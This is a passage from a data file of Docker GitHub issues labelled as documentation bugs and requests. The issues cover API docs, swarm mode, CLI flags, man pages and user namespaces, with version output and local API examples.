DK5H:F7GU:NOI7:EQKM:4JQG:IXVD:Z2ZJ:5LRM:2CV7:DI5J:B7Y4:YY2V\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nWARNING: bridge-nf-call-iptables is disabled\nWARNING: bridge-nf-call-ip6tables is disabled\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1.  View [docker run reference - Security configuration](https://docs.docker.com/engine/reference/run/#/security-configuration)\n\n**Describe the results you received:**\nWhile reading `docker run`'s SELinux _Security configuration_  section, noticed reference to `--permissive` flag as a method to disable SELinux enforcement for a particular container by Docker Engine.  Relevant passage:\n\n \"_To disable the security labeling for this container versus running with the --permissive flag, use the following command:_\"\n\nHowever, `docker run` doesn't support `--permissive` flag, as it generates message: `unknown flag: --permissive`.  Therefore, given the context, documentation should have instead cited `--privileged` option.\n\n**Describe the results you expected:**\n\"_To disable the security labeling for this container versus running with the **--privileged** flag, use the following command:_\"\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation"],"text":"This is an issue with the documentation for setting up TLS in a swarm which can be found [here](https://docs.docker.com/swarm/configure-tls/). In [Step 3](https://docs.docker.com/swarm/configure-tls/#/step-3-create-and-sign-keys) it says that a file called `node-priv.key` will be created which will contain the private key. However, no reference to a `.key` file is found anywhere else in the document. I'm not really sure what changes need to be made, as far as I can tell it crates the private key in a file called `node-priv-key.pem`, but I'm not sure if anything else needed to be done.\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nI'm not able to find the actual markdown file in the `/docs` folder in the repo which contains the guide.\n\n**Steps to reproduce the issue:**\n1. Go through the [swarm/configure-tls](https://docs.docker.com/swarm/configure-tls) guide\n2. Expect a `.key` file to be made at some point\n3. It isn't\n\n**Describe the results you received:**\nThe resulting keys two `.pem` files are created, with one of them suggesting it's the private key.\n\n**Describe the results you expected:**\nDocs to either refer to the private key consistently or have steps for creating the `.key` file\n"},{"labels":["documentation",null],"text":"**Steps to reproduce the issue:**\n1. Go to https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/display-system-wide-information and search for /swarm to look for how to get swarm join token \n2.\n3.\n\n**Describe the results you received:**\n\nNo results on how to retrieve swarm join token. \n\n**Describe the results you expected:**\n\nThe API to retrieve the swarm join token should be available on the API docs\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation",null,null,null],"text":"I would like to put together a quick guide for Docker on ARM - especially Raspberry Pi. There is a `curl | sh` method newly available which makes the process quicker and easier. From my perspective this should feel as close as possible to the experience of Docker on x86_64. \n\nI'd like to put a short/simple guide together:\n- Recommended (default) OS to be Raspbian (Jessie Lite)\n- `curl | sh` recommended installation method\n- A mention to the problem with multi-arch - i.e. `docker run busybox` won't work\n- A recommended base image: `resin/rpi-raspbian`\n- Give short example of Dockerfile for Node.js, Python\n- Short mention of GPIO (accessing the input output headers on the device) and privilege mode.\n- A disclaimer / buyer beware.. few words on limitations.\n\nPotential follow-up guide:\n- Building Docker on ARM\n- Adding a swap file\n- Expected build duration\n- Limitations\n\nRef: \nhttps://github.com/docker/docker/issues/24561\n\nInput especially welcome from @DieterReuter , @estesp , @crosbymichael @StefanScherer as follow-up. @thaJeztah what are your thoughts?\n"},{"labels":["documentation",null],"text":"At the CLI we expose this with `--with-registry-auth` but the API docs don't explain how API clients can send the registry auth information on service creation or update.\n"},{"labels":["documentation",null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\nIt looks like the 1.12.0 changelog doesn't have the docker proxy changes made in https://github.com/docker/docker/pull/23312. I don't think the docs have been updated either.\n"},{"labels":["documentation",null,null],"text":"The `/swarm/leave` api supports a `?force=true` parameter and it should be documented in the [api docs](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/leave-a-swarm). I'll be glad to send a PR for this.\n"},{"labels":["documentation",null,null,null],"text":"Currently, the Swarm Init api (/swarm/init) returns the node id when the swarm is successfully initialized:\n\n```\ncurl -XPOST --unix-socket /var/run/docker.sock http:/swarm/init -d '{\"ListenAddr\": \"127.0.0.1\"}'\n\"ejdf53mtjiqp8feyf1907si12\"\n```\n\nThis behavior is not documented in the [api docs](https://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/initialize-a-new-swarm).\n\nI believe this should be documented and I can send a PR for that.\n"},{"labels":["documentation",null,null],"text":"I am trying to run a program inside a docker container with user namespace support that requires some capabilities. Inside the container I am able to see that the capabilities were added but when I make calls that require these capabilities they fail.\n\nThe same calls work fine when I bypass user namespace with `--userns host` and add the required capabilities with `--cap-add`.\n\nSo far I have tested changing the scheduling policy and thread priority with a C program and `chrt`. This requires the `SYS_NICE` capability.\nI have also tested creating a message queue with larger sizes than allowed in `/proc/sys/fs/mqueue`. For the call to succeed the program would require the `SYS_RESOURCE` capability.\n\nWhen reading the documentation for user namespace support in dockerd it doesn't seem like this would not be a supported feature. In my opinion this would be a very useful feature that would increase security by enabling users to run semi-privileged programs in their own user namespace.\n\nIn any case, in the Docker engine reference for dockerd under \"User namespace known restrictions\", the following paragraphs should be modified to reflect these new restrictions:\n\n> Using --privileged mode flag on docker run (unless also specifying --userns=host)\n\nUsing `--privileged` mode or `--cap-add` for certain capabilities on docker run (unless also specifying --userns=host)\n\n> Finally, while the root user inside a user namespaced container process has many of the expected admin privileges that go along with being the superuser, the Linux kernel has restrictions based on internal knowledge that this is a user namespaced process. The most notable restriction that we are aware of at this time is the inability to use mknod. Permission will be denied for device creation even as container root inside a user namespace.\n\nThis paragraph could be extended to list all the functions that fail or capabilities that have no effect.\n\n---\n## BUG REPORT INFORMATION\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:11:10 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:11:10 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 6\n Running: 1\n Paused: 0\n Stopped: 5\nImages: 20\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/296608.296608/aufs\n Backing Filesystem: extfs\n Dirs: 25\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge null overlay host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor seccomp\nKernel Version: 4.4.0-34-generic\nOperating System: Ubuntu 16.04.1 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 2.768 GiB\nDocker Root Dir: /var/lib/docker/296608.296608\n\n```\n\ndockerd run command:\n`/usr/bin/dockerd --userns-remap=default -H fd://`\n\nI am running an Ubuntu VM on VMware Player on Windows 7\n\n**_For scheduling:**_\n**Steps to reproduce the issue:**\n1. `docker run -it --rm --cap-add SYS_NICE ubuntu bash`\n2. `chrt -f -p 99 1`\n\n**Describe the results you received:**\n`chrt: failed to set pid 1's policy: Operation not permitted`\n\n**Describe the results you expected:**\nI get the expected results using `--userns host`\n1. `docker run -it --rm --userns host --cap-add SYS_NICE ubuntu bash`\n2. `chrt -f -p 99 1`\n3. `chrt -p 1`\n`pid 1's current scheduling policy: SCHED_FIFO`\n`pid 1's current scheduling priority: 99`\n\n**_For the message queue:**_\nHere is a simple C program to test the message queue: https://gist.github.com/DeathTickle/aa8f980577d498850af4e819319636f9\n\nModify (or don't) the `QUEUE_SIZE` and `QUEUE_MSG_SIZE` defines to be greater than `/proc/sys/fs/mqueue/msg_max` and/or `/proc/sys/fs/mqueue/msgsize_max`\n\ncompile it with `gcc mq_open_test.c -o mq_open_test -lrt`\n\n**Steps to reproduce the issue:**\n1. `docker run -it --rm --cap-add SYS_RESOURCE -v $PWD/mq_open_test:/mq_open_test ubuntu bash`\n2. `./mq_open_test`\n\n**Describe the results you received:**\n`mq_open: Invalid argument`\n\n**Describe the results you expected:**\nI get the expected results using `--userns host`\n1. `docker run -it --rm --userns host --cap-add SYS_RESOURCE -v $PWD/mq_open_test:/mq_open_test ubuntu bash`\n2. `./mq_open_test`\n"},{"labels":["documentation"],"text":"Current man pages are not all consistent in term of content, placement and sections. There is also a lot of _duplication_ between man pages and cli reference documentation as they are maintained separately. This issues is there to discuss on those subjects and follow evolutions of our generation process.\n\nThe main goals are the following and take most of the inspiration from `git` man pages and reference documentation :\n- Have consistent man page across commands.\n- Have cli reference documentation be in sync (or the same) as man page (just a web page for it).\n- Have (or not) man pages generated from source (part of it or all of them).\n### Man page style guide\n\nWe currently don't have any style guide for man pages, i.e. what information to put where and in what order. As code style guide, we might want to define a _man page style guide_ document that would define what makes a good man page for `docker` commands. This is related to #16219.\n\nThat could look something like :\n\n```\n## NAME\n\ncommand - short description of the command\n\n## SYNOPSIS\n\ncommand --with --some --flags --and [OPTIONS] …\n\n##  DESCRIPTION\n\nA description is more detailed than what's in the NAME section, explaining more in depth what the command does (but that's all)\n\n## OPTIONS\n\n-a --all\n\nFlags descriptions …\n\n## ADDITIONAL SECTION 1\n\nAdditional section are possible. An example would be `FILTERING` and `FORMATTING` for the `docker-ps` command, or something about the reference format for command that allow us to set them (like `docker-commit`, `docker-tag`, …).\n\n## ADDITIONAL SECTION 2\n\nNo limit in the number of section though 👼\n\n## EXAMPLES\n\nHere, we just gives example on how to do this on that ; this is not where we explain how to filter container (it's done in its own section), just a working example of it.\n\n## ENVIRONMENT AND CONFIGURATION VARIABLES\n\nIf there is any environment variable or configuration (in the client/daemon config file) related to the command, we'll talk about it here ; like `ImagesFormat` for `docker-images` formatting.\n\n## SEE ALSO\n\n```\n### Man page and cli ref doc maintainability\n\nMaintaining separately man pages and cli reference documentation is error prone, it's easy to forget some flags or description somewhere. It's related to #19088. The basic idea would be to generate man pages and cli reference documentation from the same source.\n\nGiven that we are trying to generate man page from the code (at least partially), we should also study a way to generate cli reference documentation at the same time — shouldn't be difficult to convert markdown/man page to hmtl 👼.\n#23825 introduced a way to generate man page directly from code — from a small subset of command right now, but goal is to do that for all commands.\n\nCurrent limitations / questions are the following (making the assumption that cli reference documentation is generated from the same source) :\n- Cobra does not seems to allow add any custom section (it only supports `EXAMPLE`).  It's possible to add `## Some Section` in the description part, but this would make the `OPTIONS` section be really far down in the man pages (which can be fine :angel:).\n- It makes \"documentation\" PR's becomes more difficult; to make changes to this part of the documentation now requires contributors to touch the actual code.\n- Should we keep around some part of the man pages/documentation in markdown files (that would be merge with generated content from cobra) ?\n\n/cc @thaJeztah @dnephin @icecrime \n"},{"labels":[null,"documentation",null,null,null],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 21:04:48 2016\n OS/Arch:      darwin/amd64\n Experimental: true\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 21:04:48 2016\n OS/Arch:      linux/amd64\n Experimental: true\n```\n\nand\n\n```\nClient:\n Version:      1.11.0\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   4dc5990\n Built:        Wed Apr 13 18:34:23 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.11.0\n API version:  1.23\n Go version:   go1.5.4\n Git commit:   4dc5990\n Built:        Wed Apr 13 18:34:23 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 99\n Running: 2\n Paused: 0\n Stopped: 97\nImages: 52\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 250\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge host overlay null\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: seccomp\nKernel Version: 4.4.15-moby\nOperating System: Alpine Linux v3.4\nOSType: linux\nArchitecture: x86_64\nCPUs: 2\nTotal Memory: 1.954 GiB\nName: moby\nID: A7F5:MEE2:XJ2N:ZQ6Q:HRKO:SRQJ:CTJF:RR3B:6K7F:SQPP:NBJ7:I7MM\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): true\n File Descriptors: 26\n Goroutines: 41\n System Time: 2016-08-10T18:29:32.322513876Z\n EventsListeners: 1\nNo Proxy: *.local, 169.254/16\nUsername: flavin\nRegistry: https://index.docker.io/v1/\nExperimental: true\nInsecure Registries:\n 127.0.0.0/8\n```\n\nand\n\n```\nContainers: 7\n Running: 0\n Paused: 0\n Stopped: 7\nImages: 1\nServer Version: 1.11.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 15\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge null host\nKernel Version: 4.2.0-27-generic\nOperating System: Ubuntu 14.04.4 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 1\nTotal Memory: 1.954 GiB\nName: xnat\nID: 3XVY:66LA:O7YA:ZRXD:5O3L:HR56:FBKD:5CG3:HAV3:JDG7:K3MX:44G7\nDocker Root Dir: /var/lib/docker\nDebug mode (client): false\nDebug mode (server): false\nRegistry: https://index.docker.io/v1/\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\nthe first machine is my local Docker for Mac installation; the second is an Ubuntu 14.04 VM in VirtualBox.\n\n**Steps to reproduce the issue:**\n1. Use the remote API to GET events, using the `since` query param.. For example, here is a simple example that asks for all events since time 0. (I have verified this behavior with other, more realistic time values.)\n\n```\ncurl --unix-socket /var/run/docker.sock http://localhost/events?since=0\n```\n\n**Describe the results you received:**\nThe events in the specified time range (in the example, from time 0 until now) are sent to me from docker, and the HTTP stream remains open.\n\n**Describe the results you expected:**\nThe events in the specified time range (in the example, from time 0 until now) are sent to me from docker, and the stream is closed. This is the documented behavior when using the `since` or `until` query params.\n"},{"labels":["documentation",null],"text":"Release notes list macvlan as released with 1.12:\n\nhttps://github.com/docker/docker/releases/tag/v1.12.0\nhttps://github.com/docker/docker/pull/23524\n\nOnly docs are in experimental\n\nhttps://github.com/docker/docker/blob/master/experimental/vlan-networks.md#user-content-getting-started\n\nPer @programmerq :\nprogrammerq [9:58 AM]  \nIt could do with a one or two paragraph description of what the macvlan driver is, what technologies it uses, the fact that it is a local scope network driver, and why you might use it instead of another local scope driver (bridge)\n\ncc: @aboch \n"},{"labels":["documentation"],"text":"Is it intentional to have 1.12 `/swarm/leave` to have a query param of `?force=true`? If so, can we have the documentation updated (happy to do it if you point me in the right direction)? If not, should it be in the body instead and possibly JSON like the rest of the `/swarm/*` endpoints?\n\nThanks.\n"},{"labels":[null,"documentation",null],"text":"**Output of `docker version`:**\n\n```\nClient:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:00:36 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.12.0\n API version:  1.24\n Go version:   go1.6.3\n Git commit:   8eab29e\n Built:        Thu Jul 28 22:00:36 2016\n OS/Arch:      linux/amd64\n```\n\n**Output of `docker info`:**\n\n```\nContainers: 53\n Running: 1\n Paused: 0\n Stopped: 52\nImages: 138\nServer Version: 1.12.0\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 186\n Dirperm1 Supported: true\nLogging Driver: json-file\nCgroup Driver: cgroupfs\nPlugins:\n Volume: local\n Network: bridge overlay null host\nSwarm: inactive\nRuntimes: runc\nDefault Runtime: runc\nSecurity Options: apparmor\nKernel Version: 3.19.0-33-generic\nOperating System: Ubuntu 14.04.5 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 4\nTotal Memory: 15.67 GiB\nName: mafiosso-HSC\nID: 4IXB:YZFW:X4AW:LUMH:4K3Z:VB5V:DNAZ:DFPP:GCRY:EJJF:PB6F:HBVX\nDocker Root Dir: /var/lib/docker\nDebug Mode (client): false\nDebug Mode (server): false\nRegistry: https://index.docker.io/v1/\nWARNING: No swap limit support\nInsecure Registries:\n 127.0.0.0/8\n```\n\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\n\n**Steps to reproduce the issue:**\n1. Post a large image via curl on /load\n\n**Describe the results you received:**\n Remote API returns code 500 with message {\"message\":\"http: POST too large\"}.\n\n**Describe the results you expected:**\nExpected behavior shloud be code 200\n\n**Additional information you deem important (e.g. issue happens only occasionally):**\n"},{"labels":["documentation",null],"text":"In the section \"Adding a host without a driver\" of the document, \"Use Docker Machine to provision hosts on cloud providers\", https://docs.docker.com/machine/get-started-cloud/#adding-a-host-without-a-driver\n\nThere is an example:\n\n``` bash\n$ docker-machine create --url=tcp://50.134.234.20:2376 custombox\n$ docker-machine ls\nNAME        ACTIVE   DRIVER    STATE     URL\ncustombox   *        none      Running   tcp://50.134.234.20:2376\n```\n\nHowever, the command will fail under `docker-machine 0.8.0`, as there should be `-d none`, so the example should be:\n\n``` bash\n$ docker-machine create --driver none --url=tcp://50.134.234.20:2376 custombox\n$ docker-machine ls\nNAME        ACTIVE   DRIVER    STATE     URL\ncustombox   *        none      Running   tcp://50.134.234.20:2376\n```\n"},{"labels":["documentation",null],"text":"https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.25.md needs to be updated. @thaJeztah kindly agreed to take care of this.\n"},{"labels":["documentation",null],"text":"This is in reference to PIDs cgroup limit https://github.com/docker/docker/pull/18697 \n\nI am confused. Whats the default value for PIDs cgroup limit? below link says setting the value to -1 allows unlimited processes to be forked\nRef:  https://docs.docker.com/engine/reference/commandline/run/\n\nBut i was checking on my machine and the default value for it is \"0\" in which situation its allowing me to do unlimited forks. First two containers dont have any PIDs limit set and by default it was '0'.\n\nRef: docker ps --quiet | xargs docker inspect --format '{{ .Id }}: PidsLimit={{ .HostConfig.PidsLimit }}'\n\\60b19cf162aaa262765608f1533d0532c324f03a2f5e1701d5d98392da624802: PidsLimit=0\n6f8a8454a6f23d29163a22ee9533756d706382bbe3ba467f11f80f3e6489fd4b: PidsLimit=0\n8f2ecc51968d29010d6b6dc58bbfcf7fb4dc4ef52b465f04ff1a37e7ed7e734a: PidsLimit=512\n"},{"labels":["documentation",null],"text":"Tried to follow the Docker Remote API 1.24 docs, and found a broken example:\n\nhttps://docs.docker.com/engine/reference/api/docker_remote_api_v1.24/#/create-a-container\n\nThe example says:\n\n``` json\nPOST /containers/create HTTP/1.1\nContent-Type: application/json\n\n{\n       \"Hostname\": \"\",\n       \"Domainname\": \"\",\n       \"User\": \"\",\n       \"AttachStdin\": false,\n       \"AttachStdout\": true,\n       \"AttachStderr\": true,\n       \"Tty\": false,\n       \"OpenStdin\": false,\n       \"StdinOnce\": false,\n       \"Env\": [\n               \"FOO=bar\",\n               \"BAZ=quux\"\n       ],\n       \"Cmd\": [\n               \"date\"\n       ],\n       \"Entrypoint\": \"\",\n       \"Image\": \"ubuntu\",\n       \"Labels\": {\n               \"com.example.vendor\": \"Acme\",\n               \"com.example.license\": \"GPL\",\n               \"com.example.version\": \"1.0\"\n       },\n       \"Volumes\": {\n         \"/volumes/data\": {}\n       },\n       \"WorkingDir\": \"\",\n       \"NetworkDisabled\": false,\n       \"MacAddress\": \"12:34:56:78:9a:bc\",\n       \"ExposedPorts\": {\n               \"22/tcp\": {}\n       },\n       \"StopSignal\": \"SIGTERM\",\n       \"HostConfig\": {\n         \"Binds\": [\"/tmp:/tmp\"],\n         \"Links\": [\"redis3:redis\"],\n         \"Memory\": 0,\n         \"MemorySwap\": 0,\n         \"MemoryReservation\": 0,\n         \"KernelMemory\": 0,\n         \"CpuPercent\": 80,\n         \"CpuShares\": 512,\n         \"CpuPeriod\": 100000,\n         \"CpuQuota\": 50000,\n         \"CpusetCpus\": \"0,1\",\n         \"CpusetMems\": \"0,1\",\n         \"MaximumIOps\": 0,\n         \"MaximumIOBps\": 0,\n         \"BlkioWeight\": 300,\n         \"BlkioWeightDevice\": [{}],\n         \"BlkioDeviceReadBps\": [{}],\n         \"BlkioDeviceReadIOps\": [{}],\n         \"BlkioDeviceWriteBps\": [{}],\n         \"BlkioDeviceWriteIOps\": [{}],\n         \"MemorySwappiness\": 60,\n         \"OomKillDisable\": false,\n         \"OomScoreAdj\": 500,\n         \"PidMode\": \"\",\n         \"PidsLimit\": -1,\n         \"PortBindings\": { \"22/tcp\": [{ \"HostPort\": \"11022\" }] },\n         \"PublishAllPorts\": false,\n         \"Privileged\": false,\n         \"ReadonlyRootfs\": false,\n         \"Dns\": [\"8.8.8.8\"],\n         \"DnsOptions\": [\"\"],\n         \"DnsSearch\": [\"\"],\n         \"ExtraHosts\": null,\n         \"VolumesFrom\": [\"parent\", \"other:ro\"],\n         \"CapAdd\": [\"NET_ADMIN\"],\n         \"CapDrop\": [\"MKNOD\"],\n         \"GroupAdd\": [\"newgroup\"],\n         \"RestartPolicy\": { \"Name\": \"\", \"MaximumRetryCount\": 0 },\n         \"NetworkMode\": \"bridge\",\n         \"Devices\": [],\n         \"Ulimits\": [{}],\n         \"LogConfig\": { \"Type\": \"json-file\", \"Config\": {} },\n         \"SecurityOpt\": [],\n         \"StorageOpt\": {},\n         \"CgroupParent\": \"\",\n         \"VolumeDriver\": \"\",\n         \"ShmSize\": 67108864\n      },\n      \"NetworkingConfig\": {\n      \"EndpointsConfig\": {\n          \"isolated_nw\" : {\n              \"IPAMConfig\": {\n                  \"IPv4Address\":\"172.20.30.33\",\n                  \"IPv6Address\":\"2001:db8:abcd::3033\",\n                  \"LinkLocalIPs:[\"169.254.34.68\", \"fe80::3468\"]\n              },\n              \"Links\":[\"container_1\", \"container_2\"],\n              \"Aliases\":[\"server_x\", \"server_y\"]\n          }\n      }\n  }\n```\n\nThe most obvious typo is that `LinkLocalIPs` is missing closing quote, and as `NetworkingConfig` and `EndpointsConfig` are misaligned at the same indent, so the closing curly bracket are missing as well.\n"},{"labels":["documentation",null],"text":"Instead of adding users to the **_docker_** group as the [Installation manuals](https://docs.docker.com/engine/installation/#installation) suggest, which is a security hole by definition and antonomasia, I think it's better to add a password to the **_docker_** group and use the **sg** and **newgrp** commands as follows:\n\nAdd a password to **_docker_** group:\n`gpaswd docker`\n\nCreate a session with the **_docker_** group added to the supplementary group ID's:\n`sg docker newgrp $(id -gn)`\n\nAt this point the user may run **docker** commands...\n\nLogout:\n`exit`\n\nNote: The **sg** command is needed to avoid running the sequence: `newgrp docker` and then `exec newgrp $USER`\n\nOn the plus side, there's no need to use **sudo** anymore with its side-effects of resetting environment variables, etc.\n"},{"labels":[null,"documentation"],"text":"<!--\nIf you are reporting a new issue, make sure that we do not have any duplicates\nalready open. You can ensure this by searching the issue list for this\nrepository. If there is a duplicate, please close your issue and add a comment\nto the existing issue instead.\n\nIf you suspect your issue is a bug, please edit your issue description to\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\ninformation within 7 days, we cannot debug your issue and will close it. We\nwill, however, reopen it if you later provide the information.\n\nFor more information about reporting issues, see\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\n\n---------------------------------------------------\nBUG REPORT INFORMATION\n---------------------------------------------------\nUse the commands below to provide key information from your environment:\nYou do NOT have to include this information if this is a FEATURE REQUEST\n-->\n\n**Describe the results you received:**\n\nin [this twitter post](https://twitter.com/solomonstre/status/759342485483184128) @shykes mentions that docker image format now includes [HEALTHCHECK](https://docs.docker.com/engine/reference/builder/#healthcheck) information, so i expected the docker image spec to contain a reference to it, but when i looked it did not.\n\n**Describe the results you expected:**\n\ni expected to see supported docker image attributes to be specified and documented.\n"},{"labels":["documentation",null],"text":"documentation — fail, can't find reason, for PR #25203, are there anyone meeting this:\n\nBuild Errors:\nFix the path under windows for dockerimages.md: https://github.com/docker/docker/pull/25203\n# Filtered (engine) Summary:\n\n```\nFound: 852 files\nFound: 0 errors\n```\n"},{"labels":["documentation",null],"text":"The API docs do not cover DELETE or POST on `/nodes/<id>`. Only GET is documented.\n"},{"labels":["documentation"],"text":"see usage case here:\n\nhttps://github.com/docker/docker/issues/25004\n"},{"labels":["documentation"],"text":"Reference to `docker daemon` v/s `dockerd` is ambiguous in \"Configuring and running Docker on various distributions\" (docs/admin/index.md).  See @mlaventure 's comment on https://github.com/docker/docker/pull/24970/files/88ebfc701238dcfacfaf1d3f0a363848460df452#r71992335\n\nThis article looks like it needs to be reworked for clarity in general. \n"},{"labels":["documentation",null],"text":"The command line reference documentation for `docker service create` and `docker service updates` lists the supported flag, but does not explain each one in detail. When possible, we should add detailed descriptions of the flags.\n\ncc @sfsmithcha\n"},{"labels":["documentation"],"text":"Current docs/tutorial refer to listen address only. When https://github.com/docker/docker/pull/24237 goes in, need to clarify the distinction between listen address and advertise address and the address auto-detection behavior.\n"},{"labels":["documentation"],"text":"need to review docs for consistent usage of \"swarm\" and \"swarm mode\"\n\n\"swarm\" is not a proper noun. It should not be capitalized except when it comes at the beginning of the sentence.\n\nThe same is true of many of the concepts for \"swarm mode:\"\nworker node, manager node, etc.\n"},{"labels":["documentation",null],"text":"Verify whether or not the rolling update implements this before waiting the update dealy\n- Wait for the health checks on individual tasks to return a state of either `Running` or `Failed`. \n"},{"labels":["documentation"],"text":"per https://github.com/docker/docker/issues/23710#issuecomment-233751568, we don't have a CLI command (yet) to view logs for a service, so for 1.12 we should document this. Related issue for 1.13; https://github.com/docker/docker/issues/24812\n\n/cc @sfsmithcha should I assign this for you? Or keep it unassigned?\n"},{"labels":["documentation",null],"text":"The event documentation needs to be updated for the `health_status:` actions that are now being sent [here](https://github.com/docker/docker/blob/576c9fa2007cfb5f379f67b11cd852800f9175c6/daemon/health.go#L142). \n"},{"labels":["documentation",null,null],"text":""},{"labels":["documentation",null],"text":"cfr: https://github.com/docker/docker/issues/23931#issuecomment-233035772\n\nThis is supported now but the usage is not clear to users.  Hopefully my comment will help to explain or maybe I could submit a patch if I somehow miraculously find some time.\n"},{"labels":["documentation",null,null],"text":"The API uses an \"open schema\", which means that new properties _may_ be added to older API versions if a newer daemon is used. However, it should still be compatible with older clients.\n\nThis is described in the documentation; https://github.com/docker/docker/blob/v1.11.2/docs/reference/api/docker_remote_api.md\n\n> Docker's Remote API uses an open schema model. In this model, unknown properties in incoming messages are ignored. Client applications need to take this behavior into account to ensure they do not break when talking to newer Docker daemons.\n\nThis wording needs some improvement, because it doesn't clearly describe that older API versions can introduce \"unknown\" properties\n"},{"labels":["documentation",null,null],"text":"Does docker swarm mode supprt high availability?  could be multi-manager in one cluster?\n"},{"labels":["documentation",null,null],"text":"Swarm integration tests have a lot of helper functions and utilities that are really useful, but really poorly organized and documented. Most of the tests themselves are in `integration-cli/docker_api_swarm_test.go`, but the helpers are spread out across files like `integration-cli/docker_utils.go`. These helper functions need doc comments describing their usage, and there needs to be a short guide written on how to use the swarm integration helpers.\n\nFor example,\n\n```\nfunc waitAndAssert(c *check.C, timeout time.Duration, f checkF, checker check.Checker, args ...interface{})\n```\n\nhas no documentation explaining usage. \n\nFurther, there are things like:\n\n```\ntype checkF func(*check.C) (interface{}, check.CommentInterface)\ntype reducer func(...interface{}) interface{}\n```\n\nIt's totally unclear what a `checkF` or a `reducer` does or how to implement one.\n\nAdding this documentation would make writing new swarm integration tests way easier. Further than just adding documentation, a good refactoring of the testing suite might be in order, to improve clarity. Breaking the swarm suite into multiple smaller suites might also be good. Pretty much the whole integration suite is a mess and it needs work, but documentation and light-touch refactoring is a really great place to start on improving it.\n"},{"labels":["documentation",null],"text":"`docker run --pid=...` was implemented in https://github.com/docker/docker/pull/10080, but only the CLI docs were updated, but not the related API changes. Support for `--pid=container:...` was added in https://github.com/docker/docker/pull/22481, which also was not documented in the API\n"},{"labels":["documentation"],"text":"We temporarily changed those links, because for this release, the docs were published before GA was released; change the links back to their actual URL before GA; see https://github.com/docker/docker/pull/24471\n"},{"labels":["documentation",null],"text":"Sorry if this is a duplicate.  I feel like I'm asking a dumb question but I couldn't figure this out even with all the documentation and tutorials.  I think it would be great if the answer went into another page of [this tutorial](https://docs.docker.com/engine/swarm/swarm-tutorial/).\n\nIn docker 1.12.0-rc3 I set up 3 